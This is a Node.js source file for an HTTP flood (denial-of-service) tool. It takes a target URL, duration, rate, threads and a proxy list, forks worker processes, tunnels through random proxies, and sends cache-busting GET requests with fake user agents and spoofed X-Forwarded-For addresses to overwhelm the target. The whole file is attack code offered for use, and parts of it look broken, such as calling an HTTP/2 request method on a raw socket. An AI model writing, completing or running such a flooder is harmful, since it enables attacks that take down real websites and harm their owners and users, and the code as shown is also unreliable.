const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fakeua = require('fake-useragent');
const fs = require("fs");
const axios = require('axios');

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

process.on('uncaughtException', function (exception) {});

if (process.argv.length < 7){
    console.log(`Usage: node target time rate thread proxyfile`); 
    process.exit();
}

const headers = {};

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
} 

function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

const ip_spoof = () => {
    const getRandomByte = () => Math.floor(Math.random() * 255);
    return `${getRandomByte()}.${getRandomByte()}.${getRandomByte()}.${getRandomByte()}`;
};

const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    rate: parseInt(process.argv[4]),
    threads: parseInt(process.argv[5]),
    proxyFile: process.argv[6]
};

const proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);

if (cluster.isMaster) {
    for (let i = 0; i < args.threads; i++) {
        cluster.fork();
    }
} else {
    setInterval(runFlooder);
}

class NetSocket {
    constructor() {}

    HTTP(options, callback) {
        const payload = `CONNECT ${options.address} HTTP/1.1\r\nHost: ${options.address}\r\nConnection: Keep-Alive\r\n\r\n`;
        const buffer = Buffer.from(payload);

        const connection = net.connect({
            host: options.host,
            port: options.port
        });

        connection.setTimeout(options.timeout * 1000);
        connection.setKeepAlive(true, 60000);

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            if (!response.includes("HTTP/1.1 200")) {
                connection.destroy();
                return callback(undefined, "error: invalid response from proxy server");
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout exceeded");
        });

        connection.on("error", error => {
            connection.destroy();
            return callback(undefined, "error: " + error);
        });
    }
}

const Socker = new NetSocket();

async function checkSiteStatus(url) {
    try {
        const response = await axios.get(url);
        if (response.status === 200) {
            console.log('Site is OK');
            return true;
        } else {
            console.log(`Site returned status code: ${response.status}`);
            return false;
        }
    } catch (error) {
        console.log(`Site is DOWN. Error: ${error.message}`);
        return false;
    }
}

async function runFlooder() {
    const siteIsUp = await checkSiteStatus(args.target);
    if (!siteIsUp) {
        console.log("Site is down. Skipping attack.");
        return;
    }

    const proxy = randomElement(proxies).split(':');
    const connectionOptions = {
        host: proxy[0],
        port: parseInt(proxy[1]),
        address: `${parsedTarget.host}:443`,
        timeout: 5
    };

    Socker.HTTP(connectionOptions, (connection, error) => {
        if (error) return;

        headers[":method"] = "GET";
        headers[":path"] = parsedTarget.path + "?" + randstr(6) + "=" + randstr(15);
        headers[":scheme"] = "https";
        headers[":authority"] = parsedTarget.host;
        headers["user-agent"] = fakeua();
        headers["x-forwarded-for"] = ip_spoof();
        headers["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
        headers["accept-language"] = "en-US,en;q=0.5";
        headers["accept-encoding"] = "gzip, deflate, br";
        headers["cache-control"] = "no-cache";
        headers["pragma"] = "no-cache";

        const request = connection.request(headers);

        request.setTimeout(10000, () => {
            request.close();
            connection.destroy();
        });

        request.on("error", () => {
            request.close();
            connection.destroy();
        });

        request.end();
    });
}
